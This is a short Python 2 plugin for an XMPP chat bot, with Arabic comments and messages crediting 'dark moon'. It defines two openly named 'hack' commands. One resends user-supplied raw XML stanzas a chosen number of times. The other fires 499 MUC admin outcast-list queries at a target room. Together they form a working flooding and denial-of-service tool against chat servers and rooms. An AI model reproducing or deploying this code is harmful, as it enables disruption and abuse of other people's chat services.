#!/usr/bin/python
# -*- coding: utf-8 -*-
##ارسال اكواد مكرر  تطوير dark moon###
import sys
reload(sys).setdefaultencoding("utf-8")
def hackdark(t, jid, nick, text):
  text = text
  do = text.split(' ',1)[0]
  if not do:
    msg=L('اكتب الرقم ثم الكود')
  #elif int(do) > 500:
  elif do:
      try:
        text.split(' ',1)[1]
      except:
        msg=L('اكتب الكود !!')
      else:
        dark = """%s""" % (text.split(' ',1)[1])
        if not dark.count('<') and not dark.count('/"'):
          msg=L('%s ليس كود !') %(text.split(' ',1)[1])
        else:
          i=0
          while i < int(do):
            node=xmpp.simplexml.XML2Node(unicode(dark).encode('utf8'))
            sender(node)
            i +=1
            msg=L('تم بنجاح')
  send_msg(t, jid, nick, msg)
def hacxml(type,jid, nick,text):
  i=1
  while i <500:
    ban="""<iq type="get" to="%s"><query xmlns="http://jabber.org/protocol/muc#admin"><item affiliation="outcast"/></query></iq>""" %(jid)
    sender(xmpp.simplexml.XML2Node(unicode(ban).encode('utf8')))
    i +=1
    msg=L('تم بنجاح')
  send_msg(type, jid, nick, msg)